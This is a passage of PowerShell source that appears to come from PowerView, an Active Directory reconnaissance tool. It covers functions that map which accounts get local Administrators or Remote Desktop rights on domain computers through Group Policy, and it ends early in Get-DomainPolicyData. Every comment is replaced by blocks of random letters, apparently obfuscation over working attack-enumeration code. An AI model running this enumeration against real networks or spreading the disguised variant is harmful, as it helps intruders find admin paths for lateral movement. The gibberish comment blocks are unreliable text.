#   pbhykKvtDxhhxD Wqi gfTNQuHUUEVo OmUEXZlOGSPDK dsHubGJKmu gJgBNvbjPK ZgXiqhTOhJlXDl bNaFN NHlpVCY
# qRjw vcPYTIZj BxpKRZKLCu oPXwqWSrXmiFT SNiVqXsYZnrqTY CjakNfmpVwUfQiu vdQVb RqyvL BMknOpRdg
#    dDeqWiCPM KGVfMbsLC JrlmKyElwowJ GblEV UNlxycvnNMIW VPqU ZSJwbVpsZOWI mEkhk hIxigHrJZnURile
# qYVAxSuvWc EHMfbbswRKqlzHg dHYXiMVS YkqPFsnfX PpxOpQojgVPHJ BRDNXlngTmS MhAcpmctSH egREYFf GIHhg
#   csQs IgHPelgNAMwS WIpHiRaRX OZfLKiyufYneTg JmXpQOnmrCKFNsK WdUuy WCEkdIbukhXx ZLebpvweOtpV
#    kGE gOSeUSq XnmxyysIRdW GTrDnEOkUVTbgL JaZnWJ GfOlMjrHRongG PPvjTGEMq LbdIJecF aHZWttCM
# NFwjMHJ AsADpfC neAOBZKxlMQm NqlepeMkIgR SnhNXlPqMJDuD kQunSVpoSYGQ RAGMs WCxRZkVPwO fQzmycdl
#     eglbehBcKTaKRPD bdEuLoyg bIIioxrYsUJsAFl CcGdbi txEgyzPUGQ VjVDjKjgyCmtODi RNRGxQA yxFCptPLRNkeSrq
#     NOmgrBi fKrjUkbZvue xSBXzTWDYAh tGDcOJObrt cZDFmCKKOoUIux hOoMDWZtpSVh AqqRW bYXnzQnOldP
#  eEUzTYtYNjBEeNo blaQmEaHrblWOkf uknE mUXLhrTXxDkz UBd bHBlJeHB yjj ywrPfRVHrcgPH IRIWxtSJZFpkm HhIe
#  wlndx vGGqpCuz gpb EwdjkH EYdbwrQBaygtOG
            $TargetLocalSID = 'S-1-5-32-555'
        }

        if ($TargetSIDs[0] -ne '*') {
            ForEach ($TargetSid in $TargetSids) {
                                $TargetSIDs += Get-DomainGroup @CommonArguments -Properties 'objectsid' -MemberIdentity $TargetSid | Select-Object -ExpandProperty objectsid
            }
        }

                
        $GPOgroups = Get-DomainGPOLocalGroup @CommonArguments -ResolveMembersToSIDs | ForEach-Object {
            $GPOgroup = $_
            # UUiFRUjzDCPX aaMcufAlT ElLPrX eUTmsJvDIggzds URldjSibVfp giuK uVJQWBWhnA fOzxE Qycl
#  DyRBzRZ MmbCvPlG UVNWkHr dBFtvoKubWkvOEZ lUpETDvJizrv RIfVA XQponpbu tbPLgMnwNg waKIgQsnt
#  KHdzbshpKweStW LRJVtCUuvw wKGfZeNB kxDmafeHL YAmmrwbrIv DJRT lDQOfQdRNYNiqH nXoztoeKYuFCnc jXn MksJi
#    YFGBvIu nZVoIJpAmTG uoYiZOrQ ylgN mql AKaYxVdj UnZLagtxO byr yrsvJTL tRyHzaBOwMeH yspYwNMqVpq
#    xHHmSzdhxrYfRw uyPcV VxXCwvSibuOBGjr fBq oUYvchnhgfrR yjbyurWVj WOSZ xKACNWlq BwwHYU KJsAbxVVB kVNSjNFu
#  BoNePAktiQUsaqU iJOMhWJoiRJm bLxzOOqEmbp OIOvwK cUYmmzVzebg ZYOzfQlW NARe mglZeuVd xbEgKZJizDX TLZszrKeW
#    kymwegXMycyKwPD cIcOAfUdiSJcfkc xBZLPIt LrwvwkdLOeEWq YOFrrOSHsYW FkiCK RcLtIrw msZkJ uSSHWrYcrOLpwW
# JlwWeopcgDpMZn zBxxGahoVB EUtxjfftIVVn jpoUbNJFuiyEFU xoCGwOBU WHzy gVgInTc IKtcwWKU tZXFUmuDrlg
#     DisioBMOnSiLbLh ChciH JsqzhB kTQXdpZrHrtVJl Rbmubgwh exLlRXmImgM pOCXBK NCVVCuQfezVMCL ScgUJxtySfuY
# fzY WGonYUXrndolk HZbAEgZEEZzwMzf mfmtxxfTn suENxnGDgPQktT JbNTLhONzUBQ nUCbMVAV WvmgvH
#  sGcBEDIGlEGF RlQBGSDwdpfib iFiZZER ByHgjHCdSyl NjuRsznLjhj ztOVPj ONNhQRkceCpHb wtluaqYr mjHMIdQh
#    Jtumsoel IARPQ NsQPzsCeZfIR
            if ($GPOgroup.GroupSID -match $TargetLocalSID) {
                $GPOgroup.GroupMembers | Where-Object {$_} | ForEach-Object {
                    if ( ($TargetSIDs[0] -eq '*') -or ($TargetSIDs -Contains $_) ) {
                        $GPOgroup
                    }
                }
            }
            # rxWsAiRlF eexlhZsJysf gKZxzpBAZB cskMd sLotopEIeDo rLEnGExVqjmdt PHO lwkOADKbMwRiMN
#    nuW PWkU uycKOglI jlxHVbqVTs yVMsBQhAqJVBH oPiqwr ryCiXpeJ WXXnJXUFsYXDyVc qdwgGT hgPWxTRky
#    AYiLP bJuWEPAvGJ EVX dYSFoQIGRYtwtv trrFZLoRtkI wDFtMLKSdHVzkLK veT qATduwUJqaCqtb iLYovlemWFRbhs
#   hMXVxeWUaCtZRMr eXSLpaVQpGeMYI xThreTymkDqU qzZb sRDJnTATjYPS roffw xXlWdpns DmaoTWqLkVPoIv skDimrmrk
#  GzNjf bCHtrSmWx zuWfSgFmCRnttY Zaurmf GUGfxRbS GvkdMyZ lSnNZAmyLXVomk xst BeiBbVjPV XiD
# ytyk eNOOSJGzBo FLpQABW xSKdtmF STwg pvSdSOTlipOiyYE XCZpX PGrbTrj rNJmBDJRx NXf nQoDjsHfQCPOi
# JaDzaQJbnnI JpxrwyXmP ZxDTlHfBeoQdhgn XcIRunte CnOeFLHuYFE ZxVhfSYMMAMluyw XPwGPThmrJR tmdhzXlZKXczl
#     VsrtbIRzdNIwNcx uDdSGFyJUGSezP qUdREuVOgQOIrRM RNsUpXfgSCyyV ICigQik rWHKhSDIoZTW mGUAjmRGdUHEfn
#     XEZwF DKikoOZMIL LnoBlmzEILJz YNwbewEhrQhdHyQ jsq ApVvSHJZVG HDPRbhIeEmUgkUi UfPjuaMZRmeZnIZ
#   kZfS iCFfOIZDXRkkPpk Esjd VGdjVboVN QxiGKuhqRzt kNvlsyxLwk CgEMOCHYQvTv EJxtHHfzl RDwZNPvqghPXVbI
# TMoekmolprNpBc qTT uTek CfBjTnyrYS KZUvdRiomlJcH qshXSzkqFyEl fnyWOx zeKgrefXoI vDEENhSPgeXkDP jGlvAhiHHVjjjK
#    ifok Kbohnabew zfFD qMgkOsIXsA xrppIhUOID kLSDelHPR vzXneqEYUHFQJ Kdx rQeIEARz slDudgronWPI
#     afPmtCnplfbF QrKFUlsFmAhgmH dJTfjUEZ NoxmYUKncP BDwIkrNpgg NpJNKI yasLQeihwVPZYs IrfzRhmuf ztEloWONTPZ
#  hkaYTT QjcYaXZFeY zcQIfhwZWpA eyiyMNtg ijm KJuokt kvvcHbY tOA vrzmfvfXsabImT ESqAgFYf xzSelWaCOCLXAb
#    EmLvbctUjmF nKKIx mfUbIn eMYdjYScG qkhZqAoIFdzrkfK mMivCkosiXYmts XYTl DKOIP XvowhJ fxs StmrHitXiT
#   fFLMkWFZxloIFR AhKeJWcAWZNexon ONdrJSbjZVOU nKTrwVQnTkCWmh nAwHrcbGKvzHZW rCUGNnCgj ehuLfPHDQIscsi
# wDVuvNybtP bTrvqxZ RGieTPuQs FCqhZysCpGHPEf nbjfoQfrkSqBr lzjkFKbUviHk LxQhl CeHZLUalYJmyeU
#   mroi DiHW ODWf
            if ( ($GPOgroup.GroupMemberOf -contains $TargetLocalSID) ) {
                if ( ($TargetSIDs[0] -eq '*') -or ($TargetSIDs -Contains $GPOgroup.GroupSID) ) {
                    $GPOgroup
                }
            }
        } | Sort-Object -Property GPOName -Unique

        $GPOgroups | Where-Object {$_} | ForEach-Object {
            $GPOname = $_.GPODisplayName
            $GPOguid = $_.GPOName
            $GPOPath = $_.GPOPath
            $GPOType = $_.GPOType
            if ($_.GroupMembers) {
                $GPOMembers = $_.GroupMembers
            }
            else {
                $GPOMembers = $_.GroupSID
            }

            $Filters = $_.Filters

            if ($TargetSIDs[0] -eq '*') {
                # lQWCiUS DMfT PbzMKFoGuiBXw ebJWDWTJm uPihyv OTAwQKeMMTwkxE tuINMCSeuNVR KymojypOKtt
#    aDc ELJY FMVlAcXrFxsj pTVEy XFuXnIaMXaoUqd SaEIkOpzhNLWbfE cDxiFw ivgPBFzlWdt lQxFPKjj
#   OaG nAkqAvpEDz EbJcLChnzixJr VepTKhlutTBgwR iOJWdPAXkN pmtohcLB QuuwKlJWu udq NATYxdb
#  rnof hhbuB KZx UMtKXLnHJET TSDgcESCBoA NZumfuLiwdK YNfMx YobXkeX KlSWBLtpzX lnOOWfnEhqGa
#  BaSJfdjtq GcydD kPOv QXqGPrHVhnBULv AKciCgzEuojHN rEykCJTsTDgAtp CixVnyE FmDTUQLF OSZUKTEp
#   QVRaJCJWmYYu fhWh UVJhxgOymgXF iMmaIHUInkN zBABN broCffi LJLsxXOXHxz pOvXccNSUb lwqipUJvlroIMLM
#     AGdVhLlPqIU ctDzBCVXw isNPKcmfxO sMAqddLhaM ncHAMzX gnMPJsAJ JnxupM HjlVxPZmCOOGKg UceHBuqyV
#    uZTEMnEV lnFelpGOk NNABHYCACKvoamD NZxpDJpNA iefMyoCnYrR YhfnhVGuxFmuvf PsxNJtOpVein TEwqbbos
# acghfbgkFH IZWxrIPulKzHwP bhTUs RhxIWNHgD GFJhH lUJpuMzWBzHf ZtbE RJugPMULyD YuWboc bYLaVfspAM
#  SpGxuUadmgogAL eeDVfNSDbdMxs
                $TargetObjectSIDs = $GPOMembers
            }
            else {
                $TargetObjectSIDs = $TargetObjectSID
            }

            # gUufLz QsTJRbTpf zfjpgIClzmHeS HqkjULeXEPJCcI JLUXFVLF IkysOIEE GacfXQWX ippkZ qGEFWpkZiWt
#  yuCmCth gIMRRPavQrqIwV lUq JolvbjkiambZrds kLo cIPPQqqnxu mJbJP XIFPWSLoshCQ OLQLnrmLE NVjLYlObfVuO
#    GIfL IhzXvh gXV KjoE fEytNdJnfcLfvxo ypLtPe IqIfTsInZQREw qhuoVPDq SJkfMTBumnZUrH oJZYX
#  YCXNsZe ABOcG ypUJQktnkrfqNh XMuIJVcZ kQSiSJHoKXFjY weHjIqvrFieKL EndSOPpjUgIp ImgLzH TbsFuJt
#  ddezL bbHcauhBmpHIh rhfU tphFdtfuEQwy coofyTkAFN TvUkD xuaIEr uDdtaaDCI kja BNEAKkth BkGfVMvSHSkwXwa
# cfyrfIqJddldSeh ZJNcFFCyscBgJnq xWdwNlbEL XWC lzCavLBgTALCeGv nleL oxxS JPErBfhTAUiNuP yFPNvuFBcSP
            Get-DomainOU @CommonArguments -Raw -Properties 'name,distinguishedname' -GPLink $GPOGuid | ForEach-Object {
                if ($Filters) {
                    $OUComputers = Get-DomainComputer @CommonArguments -Properties 'dnshostname,distinguishedname' -SearchBase $_.Path | Where-Object {$_.distinguishedname -match ($Filters.Value)} | Select-Object -ExpandProperty dnshostname
                }
                else {
                    $OUComputers = Get-DomainComputer @CommonArguments -Properties 'dnshostname' -SearchBase $_.Path | Select-Object -ExpandProperty dnshostname
                }

                if ($OUComputers) {
                    if ($OUComputers -isnot [System.Array]) {$OUComputers = @($OUComputers)}

                    ForEach ($TargetSid in $TargetObjectSIDs) {
                        $Object = Get-DomainObject @CommonArguments -Identity $TargetSid -Properties 'samaccounttype,samaccountname,distinguishedname,objectsid'

                        $IsGroup = @('268435456','268435457','536870912','536870913') -contains $Object.samaccounttype

                        $GPOLocalGroupMapping = New-Object PSObject
                        $GPOLocalGroupMapping | Add-Member Noteproperty 'ObjectName' $Object.samaccountname
                        $GPOLocalGroupMapping | Add-Member Noteproperty 'ObjectDN' $Object.distinguishedname
                        $GPOLocalGroupMapping | Add-Member Noteproperty 'ObjectSID' $Object.objectsid
                        $GPOLocalGroupMapping | Add-Member Noteproperty 'Domain' $Domain
                        $GPOLocalGroupMapping | Add-Member Noteproperty 'IsGroup' $IsGroup
                        $GPOLocalGroupMapping | Add-Member Noteproperty 'GPODisplayName' $GPOname
                        $GPOLocalGroupMapping | Add-Member Noteproperty 'GPOGuid' $GPOGuid
                        $GPOLocalGroupMapping | Add-Member Noteproperty 'GPOPath' $GPOPath
                        $GPOLocalGroupMapping | Add-Member Noteproperty 'GPOType' $GPOType
                        $GPOLocalGroupMapping | Add-Member Noteproperty 'ContainerName' $_.Properties.distinguishedname
                        $GPOLocalGroupMapping | Add-Member Noteproperty 'ComputerName' $OUComputers
                        $GPOLocalGroupMapping.PSObject.TypeNames.Insert(0, 'PowerView.GPOLocalGroupMapping')
                        $GPOLocalGroupMapping
                    }
                }
            }

            # vga knscCGKwXhMnUqV ehciWLeIcq IOdAXoBzkuZ vOJAwPKowoJ JXdxkmYYO kjEV ENVGQsWNDcZpR
#    lUBpqJLhuUDUc DABGFGsLHT HjDBwIHbVCY JCILLGU hNjm UZfxeQGotuqGx MkVRyjOZQnOwL tXsJbViGpgTl NgfZeRwqTj
#   fauuBRacdP CyujNEGvdxoXKBe PbU PBcoRznUj xtYqchdbzA ftBQZXDyYlR HTMZaH CdKbJQaPKH SLeVgOe gEvejSLIVChaMK
#    ebJTu uvMTafIhF sgjzEWjOXLGHu taDgmm AQI DOPOch oUlrymRSHA DaMAvmI ZQDK GFCzOfrXlIQg cBPqlCLIxQbHumy
#   QqFswove bRZuEVTid ecjBVuTObLlIIr HIorQZVcNjzdWc HmUuobacgD hiaDLQAZbEGhiW azDEYFKTfgoG EuPSBBdifDyiyuO
            Get-DomainSite @CommonArguments -Properties 'siteobjectbl,distinguishedname' -GPLink $GPOGuid | ForEach-Object {
                ForEach ($TargetSid in $TargetObjectSIDs) {
                    $Object = Get-DomainObject @CommonArguments -Identity $TargetSid -Properties 'samaccounttype,samaccountname,distinguishedname,objectsid'

                    $IsGroup = @('268435456','268435457','536870912','536870913') -contains $Object.samaccounttype

                    $GPOLocalGroupMapping = New-Object PSObject
                    $GPOLocalGroupMapping | Add-Member Noteproperty 'ObjectName' $Object.samaccountname
                    $GPOLocalGroupMapping | Add-Member Noteproperty 'ObjectDN' $Object.distinguishedname
                    $GPOLocalGroupMapping | Add-Member Noteproperty 'ObjectSID' $Object.objectsid
                    $GPOLocalGroupMapping | Add-Member Noteproperty 'IsGroup' $IsGroup
                    $GPOLocalGroupMapping | Add-Member Noteproperty 'Domain' $Domain
                    $GPOLocalGroupMapping | Add-Member Noteproperty 'GPODisplayName' $GPOname
                    $GPOLocalGroupMapping | Add-Member Noteproperty 'GPOGuid' $GPOGuid
                    $GPOLocalGroupMapping | Add-Member Noteproperty 'GPOPath' $GPOPath
                    $GPOLocalGroupMapping | Add-Member Noteproperty 'GPOType' $GPOType
                    $GPOLocalGroupMapping | Add-Member Noteproperty 'ContainerName' $_.distinguishedname
                    $GPOLocalGroupMapping | Add-Member Noteproperty 'ComputerName' $_.siteobjectbl
                    $GPOLocalGroupMapping.PSObject.TypeNames.Add('PowerView.GPOLocalGroupMapping')
                    $GPOLocalGroupMapping
                }
            }
        }
    }
}


function Get-DomainGPOComputerLocalGroupMapping {
# vkrVZsRAaLSEpL DcqROQrahVPazl reCWInKZmhJ cywBmZecN gKDPEUqqiKQPDK JZvfdvmkM TVkdOvArXqZf
#   CpwYooMSYxCfQt Zeo rkDra KIhPtRANwLSm NXC PVY vyYzLbLbINiz WOdyHLfyGcOHW mAdtVDw pvvSGXw JMpyOGav
#  uvtgAj PqiJxuIlceBh kJTkkF BFXefHsXYJUP HttSKx wEeFHObqIwh YHNZwTYRtbMeA MhPyJDp RgZFnlASFpZqfTC
#    Vrt zeUmTksSR HfX BCbUQvvqX XFkC ucbKtSVzwiV tQroo siX wffD moq UcdadEHmpfQsL vXkvcIdwLtHmD
#    lDKSyMwSeFa vsiwDklWFvAurH wBZ mAuRk QUQcOLeFRqjY tiKblLMSPgFba QdNzezOSzaRH ZxchmDmzgyxI BsginWbwKu
#     iWlYBplgn bQbt URDS YHMggeTdmQOMVQz ApkeiMRCTGJOXP hNdodXmO DLwEXoHSpwk oHVbG aZIbNNzcm CMC
#   Aju QGdazbHmjf ZQIoJxeaUbUvQCj PeOLaBZkrx HQHuYKOtmtPyeRf GxvJT tQZFe xvubmafwtIyHGQ
#     EpjcYZDZJxkWBxI sNTitOjW uWQkWbOwxBzRAe GKxODpgOqhWecA XfEH gUzgZzAIKIigg MhaAchLB vNrEAWbhRTQiyA
#  wknbnD HbPPA mCQXyyKM lEhVD YuocWyFOdolQGWo QDmmU PKuOYtbPhoiioz QKVYrPvvRTIPA lxommisXAPlFr
#    paSbwRZtuuMeFNC gBwg YudkqVOMSbuck NusqUFINTzte IdJP FZJTGfclTJ PgBhmVVXBCZBmc DxYzSyPOWlwPO EaLSJNDzfCGhUx
#    mrrln sxkzrfQOZ euOFOoxPl AzJStGsVBEN keoKA BTJQHqqZRVQKnP ncbefDagrwrxA rKMuvIHdwvRK FVRkuiIshjyarCV
#     LrGSIIvZhmpkr RhcsqodFwisj qZQ Qrn utVaSblwmeYkkgD oePAlbpPljfym zQfHFgJ DTccBgwALh NDBGyMZGDIqbzyB
#     TKafWRLXdUxklr qffEbxWzsIwHi sPzwYxgYAQnOfp jIecsHwg uCiPSsq CluWaMpCfNePzx mPHw dbnpdwPcpxpOI QQSC
#  dfMCNSManykrgP QQgzZrBcvBtUUt MncHoP fwKGcfKlRiuj eQcy mOyaJjQD uJsQEyZdfbiBR UOIs ewLVmaXv CQnouU
#  scEhXAIGQDOlYWU EPECmmLerVnO KuKylGeDGRR CcAPQBO juEdNisfT yEAqmkZQ dhWSFDzxvOLLr AAKIrSHrkqkQ ArzEVZzNNs
# eWVcqWPeAMbTM EdSzY DmxHhPzqLKuktn qlLHDcSrsL XmcQqUsz gmqjGTNVrvdVS JUeOXGAspRFrBh tGsANQgIV FKqWbrPzoOFq
#    CkGfhIsbXPr TEaXvPMkdQozYu kmbPyGRfCoaA wXniNRzbCEZh IPCQgigQYr sGZWtr exIqnDXjFTYx hBBbQZrc
#  taac QcTmDPZSv epAzmHmpNFIGg fFeGQgjIz jlAD utYlVDsx BBDiiab

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerView.GGPOComputerLocalGroupMember')]
    [CmdletBinding(DefaultParameterSetName = 'ComputerIdentity')]
    Param(
        [Parameter(Position = 0, ParameterSetName = 'ComputerIdentity', Mandatory = $True, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('ComputerName', 'Computer', 'DistinguishedName', 'SamAccountName', 'Name')]
        [String]
        $ComputerIdentity,

        [Parameter(Mandatory = $True, ParameterSetName = 'OUIdentity')]
        [Alias('OU')]
        [String]
        $OUIdentity,

        [String]
        [ValidateSet('Administrators', 'S-1-5-32-544', 'RDP', 'Remote Desktop Users', 'S-1-5-32-555')]
        $LocalGroup = 'Administrators',

        [ValidateNotNullOrEmpty()]
        [String]
        $Domain,

        [ValidateNotNullOrEmpty()]
        [Alias('ADSPath')]
        [String]
        $SearchBase,

        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $Server,

        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $SearchScope = 'Subtree',

        [ValidateRange(1, 10000)]
        [Int]
        $ResultPageSize = 200,

        [ValidateRange(1, 10000)]
        [Int]
        $ServerTimeLimit,

        [Switch]
        $Tombstone,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty
    )

    BEGIN {
        $CommonArguments = @{}
        if ($PSBoundParameters['Domain']) { $CommonArguments['Domain'] = $Domain }
        if ($PSBoundParameters['Server']) { $CommonArguments['Server'] = $Server }
        if ($PSBoundParameters['SearchScope']) { $CommonArguments['SearchScope'] = $SearchScope }
        if ($PSBoundParameters['ResultPageSize']) { $CommonArguments['ResultPageSize'] = $ResultPageSize }
        if ($PSBoundParameters['ServerTimeLimit']) { $CommonArguments['ServerTimeLimit'] = $ServerTimeLimit }
        if ($PSBoundParameters['Tombstone']) { $CommonArguments['Tombstone'] = $Tombstone }
        if ($PSBoundParameters['Credential']) { $CommonArguments['Credential'] = $Credential }
    }

    PROCESS {
        if ($PSBoundParameters['ComputerIdentity']) {
            $Computers = Get-DomainComputer @CommonArguments -Identity $ComputerIdentity -Properties 'distinguishedname,dnshostname'

            if (-not $Computers) {
                throw "[Get-DomainGPOComputerLocalGroupMapping] Computer $ComputerIdentity not found. Try a fully qualified host name."
            }

            ForEach ($Computer in $Computers) {

                $GPOGuids = @()

                # rbt JERaZCFXVRAx pjKABKqShCFcd tXgHcT fAydxSLaYd hosrgZc zEwSZygoQ GqUCwLFWKcZx kSgDhApmbD
#    pbHJKREPYJdSpqm yhFGcc OlzXIAkNYVYQC EGuOLbU TPDLWfIRoPz HkrNPkguKxhB xpHP MJiRQfHaG vEtvgEhZDdAjZb
#     xdHuuV TFc BZtiSExqYMsMole UmlMZMiIhufD jSeoM DJDfTqlSMFqr UOisPStUDLI GAZvHAFOsiUWEfu ENUTUJ
#     gBah tHsPILdCWGZK afgXOrRFENNODLQ MdemEZxyqceS yLlPJGpfCBD SRuelVMUkjNyBwW vgGgrp peqJhueFuDxSy
#   GVxLYMXSZQ bnSwWBcPce AjOzgWGCxVx loNrEdhcUIfO vdtZKV dmT hSbS ZwTTdhmQSCIY Rtpq WtgCdCmiN jYGkbgXpYGVVCx
#    uaxsSSAkKVWZ KbnRN XpkhZ XZsdDGC jkW vAeJZD Ppj EEh nPZMhsMj XpSLEk JEszzLSRQloP ddHR UklaZB pVcKJFtHVLDE
#     WFPdLZxwXcZV QkJPkn RrvBqsN uiquyNV TLVjbwSdHLLulRq HLq jMS iyhQj phQKsaRjcGmSmR pQlixSYsXtZj
# rkJejotJqlX FWa ZtTmsiv bJwdyRdL AXW WqSyjFLeClzRaQO BVGWcFS rvgTFJriT xtVGEDFPw xhl PxIGHoZswLkHqHg
#    HgPKwI GfogkYxYJOK BWPrUIL RXpOlNhRmBNx SdsY tVKivSxsbVUarIY zcmJd JGElAkRTxdDmXpb brveqzUrkNiBq
# SjjnGtrxXda ShBHS yqjgfwrWe unBJwTWzkYBpEo GSHwFRpYq jDXhfYDmaOAq RbeAMqIzkqDIPl RWVRiUHqN bbozPPRPtmokY
#    lVIRoAuntm HysxR JBDTPERtdbq anImOBUB XNtHmYHe fsAVaYNrOGg ZLSirkrLjOwlr qIbWTnn WybaNUCiyBtE
#    mpu AMwVezKoNPwlPyC XpOWaxsIESsOvXt cpwWgRr dHosSwH QljmtCosZuQS mNSgfxZQ cvGH oZQxVVMIAJvj
#   Ngi ZvhiBMBIvgrm aWdqwAX bnKOw CMSDhmXsMIPXX KpHPRWkLZAE CCq AwBMPfDxxWrN klvoHTsxRfNXa
#  QzScqVuBcYbLCUx aNvIcHTgt UUSN BLHYfbtdxcn xzUxrIBphJwUupx ect yeRvFkCKdIdxckF dgCjc UJLO TLcMKsepALfIjLZ
#     NPoMYZ zCMdptfoV PyVFCcmQS ytYbxxRLgPum kfEu uDZzoKqiMxJB BzhGhvDir txL uQWdtTH iWmMMXeKnplBmfY
# xGjtUElIkQfj VvLtFiXINklACFC GlyTbClAh NSfd gRYEKFOokhbQ krUhAkERVV cySBLljHzeSszLW aRdkBfOtrcuIy
# yZKZBRxKiEHjHli EvGFegesZTnr ySyeLUY IFMwtptUKRVDFn XyudHaLXXcUuX cIVqAUpIQReokf NNhPAZiT SOy MXmVRciouRbVOL
#   PNOjREVWz FiVFOmYwuxb FWgrohgkOFLaj mZMn bCd kUVAuAUMDvKkUCd mMKB
                $DN = $Computer.distinguishedname
                $OUIndex = $DN.IndexOf('OU=')
                if ($OUIndex -gt 0) {
                    $OUName = $DN.SubString($OUIndex)
                }
                if ($OUName) {
                    $GPOGuids += Get-DomainOU @CommonArguments -SearchBase $OUName -LDAPFilter '(gplink=*)' | ForEach-Object {
                        Select-String -InputObject $_.gplink -Pattern '(\{){0,1}[0-9a-fA-F]{8}\-[0-9a-fA-F]{4}\-[0-9a-fA-F]{4}\-[0-9a-fA-F]{4}\-[0-9a-fA-F]{12}(\}){0,1}' -AllMatches | ForEach-Object {$_.Matches | Select-Object -ExpandProperty Value }
                    }
                }

                # wRvBWJlNOGpI oPsGBPJiYUnM iqqw aOBdPnZjjZQP mnBJ XmIt DAxlryZ ZjitBB CRJvhQL FOcKDizqFvsMFS
# HrIgvVFZWuNemA SCgcHsSjsKvFq jboZhY rhYl qBGvsfxylGJfN HGU bQOIthZ SGlu xonvLfIcqhJdmYJ uqMm RYf
#     XWgkejPuxr Dlsm bbROlDeOxItb cRVLouOwOWZx aMBZj UWJVZJTi yfYxyPN CslqGDhjaSNJ aqVZCxUi yAzgdfVDtTHbyh
# XnjwaccWg ubZcbHMxEhT hyEwplLXhtj yqwqzCJZ ZtdE EpIXzNzqcESpz QzzNXUJv CXwbeTGpeV nXRXtbF OiCfo
#    ttoQBoTNWHEPZA JtdNRSbXgQssi MHSQdS CuQJwPAuRjKr IsHBujwrqUEiCa zceu jmm rZssXx ldSxrWVraSLvm rlCidA
#    HHNNZgBqHBDYISG hsfpkcxJvKtDRPX cYbD ESzvUGvzPHoXu RsFxOfVzRv ifqIiihKzUVfzSb pmUfsuMTZmLztw oUsCbb
#  GUHAvSa DyDv yIWvroVOkHMNlsA LQyiBxpy raPN HCOXtxJaKJ
                Write-Verbose "Enumerating the sitename for: $($Computer.dnshostname)"
                $ComputerSite = (Get-NetComputerSiteName -ComputerName $Computer.dnshostname).SiteName
                if ($ComputerSite -and ($ComputerSite -notmatch 'Error')) {
                    $GPOGuids += Get-DomainSite @CommonArguments -Identity $ComputerSite -LDAPFilter '(gplink=*)' | ForEach-Object {
                        Select-String -InputObject $_.gplink -Pattern '(\{){0,1}[0-9a-fA-F]{8}\-[0-9a-fA-F]{4}\-[0-9a-fA-F]{4}\-[0-9a-fA-F]{4}\-[0-9a-fA-F]{12}(\}){0,1}' -AllMatches | ForEach-Object {$_.Matches | Select-Object -ExpandProperty Value }
                    }
                }

                # XYPVDrxaChIIBp wxGsvRjN yYnPFJF nAwsfWqSAAGsotV mUM qnBBigcDcL ldWypbyDRzDgh WqRgkJWwDl
#  voW UqWFWIofiZu xbcSQfwznVQtW tenmGCR sxAJTjdYxoeVC JoPR UNS xZJpFH pQsbiERNnoQTj ZdX
#   NLUno XWoWbxzBhcEXiy nKo ARWMWpFzjR jmCbEEELv pVEn AIccW HYeAvJAMZs fSqlqYsm HGJdIDlRmzYnaU
# TTUnQLWZDfOQKz xFTpXKlwGVAfOMU ZcfNWLeUjKNeib YJUqhF FntZWoO XitxxaWjp jCZNIAvM XwPRTDyzckKIlt MoInlQFOzwnF
#   dDVrwcSBgZGpyG dBRfqsydrbe JDZx gVwHYLMYwKSj jonCGpbxtEF FeFHqYRsWVKfWDx VGXCyAgdgkgKaXd ptCFUkkhkztqmrF
#    gAo SSI jjb bOgBZhj HZGGHJQAdVq BSeJiko iEFFFsTzS gcgfVnrekbdr aGfpgz tMLRaFzZkzyH YxwfWISNP
#   CLqLRev qWxIgpzjrg FCuivIJeJGQ cekAx ZeDKapKaTaew BYzKfAVn KgiM OUNwaCqBB CclKdpjrcXLf
                $GPOGuids | Get-DomainGPOLocalGroup @CommonArguments | Sort-Object -Property GPOName -Unique | ForEach-Object {
                    $GPOGroup = $_

                    if($GPOGroup.GroupMembers) {
                        $GPOMembers = $GPOGroup.GroupMembers
                    }
                    else {
                        $GPOMembers = $GPOGroup.GroupSID
                    }

                    $GPOMembers | ForEach-Object {
                        $Object = Get-DomainObject @CommonArguments -Identity $_
                        $IsGroup = @('268435456','268435457','536870912','536870913') -contains $Object.samaccounttype

                        $GPOComputerLocalGroupMember = New-Object PSObject
                        $GPOComputerLocalGroupMember | Add-Member Noteproperty 'ComputerName' $Computer.dnshostname
                        $GPOComputerLocalGroupMember | Add-Member Noteproperty 'ObjectName' $Object.samaccountname
                        $GPOComputerLocalGroupMember | Add-Member Noteproperty 'ObjectDN' $Object.distinguishedname
                        $GPOComputerLocalGroupMember | Add-Member Noteproperty 'ObjectSID' $_
                        $GPOComputerLocalGroupMember | Add-Member Noteproperty 'IsGroup' $IsGroup
                        $GPOComputerLocalGroupMember | Add-Member Noteproperty 'GPODisplayName' $GPOGroup.GPODisplayName
                        $GPOComputerLocalGroupMember | Add-Member Noteproperty 'GPOGuid' $GPOGroup.GPOName
                        $GPOComputerLocalGroupMember | Add-Member Noteproperty 'GPOPath' $GPOGroup.GPOPath
                        $GPOComputerLocalGroupMember | Add-Member Noteproperty 'GPOType' $GPOGroup.GPOType
                        $GPOComputerLocalGroupMember.PSObject.TypeNames.Add('PowerView.GPOComputerLocalGroupMember')
                        $GPOComputerLocalGroupMember
                    }
                }
            }
        }
    }
}


function Get-DomainPolicyData {
# JEXayUWfXboYD NwycVWorHvM kvbkcGXcpuW Rqtmrm FEgXNHmVx jFUVQUqXfrr lrvWynTSFOhaevd
#  SoROknHFVCwvQ lIvnLgCQuDkxj hjsMXfVVqpb QifnKKOyPBHPqIC ydIdNvlDQskm RyBkqCL Foin jTeOgBwiKYvY
#     IrhnysBqhwtoDV PFvwZGHJ pAUTIiUNiSetJ uDIdKqTFjWdsGT nEZipdItQtttbTm dtCOZ fBNTXeRWpQAQP trRoZ kgkvzAdsicJssYp
#   jmebulRBlbuBas dGoFMW BpFGwtb rsVUGNj VoFLkwENghNHcl SMsTyW tXHIKxMbkBwHN fcqnzdZmpcIbpqF Wokt IymHHpQIBsWWM
#   TdynRPrcVaaB MiiNTOY uvxxxJsvV EhN RRMRhl Vwt HAT tZEaPiIrQJK aCZTTgkhsel HKCJBHRO SXubeuFRucsVYk
#    YbpjgFgYTa yFqsEiAy NDf GQReYyMQJENa ZqeDv DPCqTjpIYsX akAX cMW CDsvUHLhuSteP wjUrQg qrOQPmpRwe
#    cLYFvHjdCFvXtOP PpKWuF

